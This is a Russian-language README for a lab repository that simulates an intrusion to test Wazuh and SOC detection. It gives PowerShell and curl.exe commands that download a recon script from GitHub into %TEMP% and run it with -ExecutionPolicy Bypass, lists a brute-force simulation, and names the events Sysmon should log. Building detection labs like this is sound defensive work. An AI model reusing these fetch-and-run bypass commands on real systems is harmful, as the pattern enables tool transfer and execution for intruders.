# test_winpeace

Лабораторные скрипты для контролируемой имитации инцидента (Controlled Incident
Detection / Response) и проверки видимости SOC в Wazuh. Только read-only recon,
никаких эксплойтов. Маркер `RECON01_<дата_час>` используется во всех прогонах
для последующей сборки цепочки атаки в Wazuh по единому идентификатору.

## Файлы

- `winpeas-lite.ps1` — безопасный аналог WinPEAS. Фокус на privesc-векторах
  (unquoted service paths, слабые ACL, autoruns, scheduled tasks, security
  posture через registry). Ничего не меняет в системе.
- `recon-lab.ps1` — разведка нативными средствами.
- `bruteforce.sh` — имитация brute force (фаза 0 плейбука).

## Запуск winpeas-lite.ps1 на хосте (Ingress Tool Transfer, фаза 4a)

Скачать скрипт с ветки и запустить из `%TEMP%`:

```powershell
$url = "https://raw.githubusercontent.com/egwyl666/test_winpeace/claude/eloquent-johnson-l8xj81/winpeas-lite.ps1"
Invoke-WebRequest -Uri $url -OutFile "$env:TEMP\winpeas-lite.ps1" -UseBasicParsing
powershell -ExecutionPolicy Bypass -File "$env:TEMP\winpeas-lite.ps1" -Marker "RECON01_$(Get-Date -Format yyyyMMdd_HHmm)"
```

Или через `curl.exe` (ближе к реалистичному ingress tool transfer):

```powershell
curl.exe -o "$env:TEMP\winpeas-lite.ps1" "https://raw.githubusercontent.com/egwyl666/test_winpeace/claude/eloquent-johnson-l8xj81/winpeas-lite.ps1"
powershell -ExecutionPolicy Bypass -File "$env:TEMP\winpeas-lite.ps1" -Marker RECON01_$(Get-Date -Format yyyyMMdd_HHmm)
```

Что ожидать в Wazuh:
- Sysmon Event 3 — сетевое соединение к `raw.githubusercontent.com`
- Sysmon Event 11 — создание файла в `%TEMP%`
- Sysmon Event 1 / 4688 — запуск `powershell.exe -ExecutionPolicy Bypass -File ...`
- Event 4104 (Script Block Text) — полное содержимое скрипта, при включённом
  PowerShell Script Block Logging

Запускать от администратора — часть проверок (Defender exclusions и т.п.)
без повышенных прав возвращают пусто по дизайну ОС, а не из-за ошибки скрипта.

## Wazuh detection (local_rules.xml)

Правила на корреляцию brute force → success (SSH/RDP) и на сам факт запуска
`winpeas-lite.ps1` (через 4104 `scriptBlockText`) ведутся отдельно на стороне
Wazuh manager, не в этом репозитории.
